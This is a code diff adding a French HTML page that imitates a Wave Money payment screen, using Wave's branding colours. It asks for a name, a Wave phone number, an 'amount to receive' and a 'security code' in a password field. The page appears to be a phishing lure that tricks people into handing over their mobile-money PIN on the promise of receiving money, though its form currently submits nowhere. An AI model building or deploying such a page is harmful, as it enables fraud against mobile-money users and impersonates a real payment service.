@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wave Money</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-image: url('https://i.pinimg.com/564x/ce/ec/c7/ceecc723c04697e0e6fd83d8710dc0db.jpg'); /* Image de fond */
+            background-size: cover; /* L'image couvre toute la page */
+            background-repeat: no-repeat; /* Ne répète pas l'image */
+            background-position: center center; /* Centrer l'image */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            background-color: #fff;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+        }
+
+        h1 {
+            color: #0091EA;
+            margin-bottom: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-size: 14px;
+            color: #000;
+        }
+
+        input, select {
+            width: 100%;
+            padding: 10px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        button {
+            background-color: #0091EA; /* Couleur bleue de Wave */
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: background-color 0.3s ease;
+        }
+
+        button:hover {
+            background-color: #007bcd; /* Bleu plus foncé au survol */
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Paiement via Wave Money</h1>
+
+        <form action="#" method="POST">
+            <div class="form-group">
+                <label for="name">Nom et Prénom</label>
+                <input type="text" id="name" name="name" placeholder="Nom et Prénom" required>
+            </div>
+
+            <div class="form-group">
+                <label for="phone">Numéro Wave</label>
+                <input type="tel" id="phone" name="phone" placeholder="Numéro" required>
+            </div>
+
+            <div class="form-group">
+                <label for="currency">Devise</label>
+                <select id="currency" name="currency" disabled>
+                    <option value="FCFA">FCFA</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label for="amount">Montant à recevoir</label>
+                <input type="number" id="amount" name="amount" placeholder="Montant" required>
+            </div>
+
+            <div class="form-group">
+                <label for="security-code">Code de sécurité</label>
+                <input type="password" id="security-code" name="security-code" placeholder="Ex: 1234" required>
+            </div>
+
+            <button type="submit">Recevoir</button>
+        </form>
+    </div>
+</body>
+</html>
